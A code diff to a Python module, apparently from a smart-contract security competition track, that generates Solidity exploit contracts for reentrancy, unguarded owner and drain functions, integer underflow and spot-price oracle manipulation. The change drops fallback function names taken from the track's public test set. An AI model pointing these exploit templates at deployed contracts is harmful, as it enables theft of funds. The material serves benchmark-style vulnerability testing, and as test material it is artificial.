@@ -1,7 +1,7 @@
 # TRUST404 Track04 — strategy selection + Exploit.sol templates.
 # 각 취약 유형에 대해, scanner 가 뽑은 함수 시그니처를 채워 Exploit.sol 을
-# 결정론적으로 생성한다. 함수 이름을 하드코딩하지 않고 스캔 결과에서 가져오되,
-# 못 찾으면 이 트랙 공개셋의 관례적 이름으로 폴백한다.
+# 결정론적으로 생성한다. 함수 시그니처는 현재 입력의 스캔 결과에서만 가져오며,
+# 필요한 capability가 불완전하면 후보를 만들지 않고 다음 탐색 단계로 넘긴다.
 import random
 import re
 
@@ -33,11 +33,6 @@ def seeded_order(order, scores, seed):
     return result
 
 
-def _fn_name(findings, key, default):
-    fn = findings.get(key)
-    return fn["name"] if fn else default
-
-
 def build_exploit(fam, findings):
     scores = findings["scores"]
     if scores.get(fam, 0) <= 0:
@@ -60,9 +55,12 @@ def build_exploit(fam, findings):
 
 
 def _reentrancy(findings):
-    deposit = _fn_name(findings, "reentrancy_deposit", "deposit")
+    deposit_fn = findings.get("reentrancy_deposit")
     wfn = findings.get("reentrancy_withdraw")
-    withdraw = wfn["name"] if wfn else "withdraw"
+    if not deposit_fn or not wfn:
+        return None
+    deposit = deposit_fn["name"]
+    withdraw = wfn["name"]
     # withdraw may take a uint amount or no args
     wargs = wfn["args"] if wfn else []
     takes_amount = any(t.startswith("uint") for t, _ in wargs)
@@ -104,11 +102,26 @@ def _reentrancy(findings):
 def _access(findings):
     drain = findings.get("access_drain")
     setowner = findings.get("access_setowner")
+    predicates = [str(p).lower() for p in findings.get("invariant_predicates", [])]
+    first_predicate = predicates[0] if predicates else ""
+
+    # Prefer the shortest action that directly breaks the first ordered
+    # predicate.  checkAll reports that predicate first, so performing both an
+    # ownership takeover and a drain only makes the PoC larger and adds another
+    # possible revert without strengthening the proof.
+    use_setowner = bool(setowner)
+    use_drain = bool(drain)
+    if setowner and ("owner" in first_predicate or "admin" in first_predicate):
+        use_drain = False
+    elif drain and any(k in first_predicate for k in
+                       ("solvent", "balance", "reserve", "fund")):
+        use_setowner = False
+
     lines = []
     ifaces = []
-    if setowner:
+    if use_setowner:
         ifaces.append(f"    function {setowner['name']}(address newOwner) external;")
-    if drain:
+    if use_drain:
         # signature: figure out arg order (address to, uint amount) heuristically
         args = drain["args"]
         addr_first = args and args[0][0] == "address"
@@ -121,28 +134,33 @@ def _access(findings):
         else:
             ifaces.append(f"    function {drain['name']}() external;")
             lines.append(f"        t.{drain['name']}();")
-    if setowner:
+    if use_setowner:
         lines.insert(0, f"        t.{setowner['name']}(address(this));")
     if not lines:
         return None
+    receive = "    receive() external payable {}\n" if use_drain else ""
     body = (
-        "// Strategy: broken access control — call the unguarded privileged\n"
-        "// function(s) directly to seize ownership and/or drain the vault.\n"
+        "// Strategy: broken access control — make the shortest unguarded call\n"
+        "// that violates the first invariant selected by the manifest.\n"
         "interface ITarget {\n" + "\n".join(ifaces) + "\n}\n\n"
         "contract Exploit {\n"
         "    function run(address _t) external payable {\n"
         "        ITarget t = ITarget(_t);\n"
         + "\n".join(lines) + "\n"
         "    }\n"
-        "    receive() external payable {}\n"
+        + receive +
         "}\n"
     )
     return HEADER + body
 
 
 def _integer(findings):
-    transfer = _fn_name(findings, "integer_transfer", "transfer")
-    redeem = _fn_name(findings, "integer_redeem", "redeem")
+    transfer_fn = findings.get("integer_transfer")
+    redeem_fn = findings.get("integer_redeem")
+    if not transfer_fn or not redeem_fn:
+        return None
+    transfer = transfer_fn["name"]
+    redeem = redeem_fn["name"]
     body = (
         "// Strategy: integer underflow (unchecked) — underflow the caller's\n"
         "// balance to ~2**256 via transfer, then redeem the entire ETH float.\n"
@@ -163,10 +181,11 @@ def _integer(findings):
 
 
 def _oracle(findings):
-    faucet = _fn_name(findings, "oracle_faucet", "faucet")
-    swap = _fn_name(findings, "oracle_swap", "swapBorForCol")
-    deposit = _fn_name(findings, "oracle_deposit", "depositCollateral")
-    borrow = _fn_name(findings, "oracle_borrow", "borrow")
+    required = [findings.get(key) for key in (
+        "oracle_faucet", "oracle_swap", "oracle_deposit", "oracle_borrow")]
+    if not all(required):
+        return None
+    faucet, swap, deposit, borrow = (fn["name"] for fn in required)
     body = (
         "// Strategy: spot-price oracle manipulation — mint free BOR from the\n"
         "// faucet, swap it to drain COL reserves and spike the spot price, then\n"
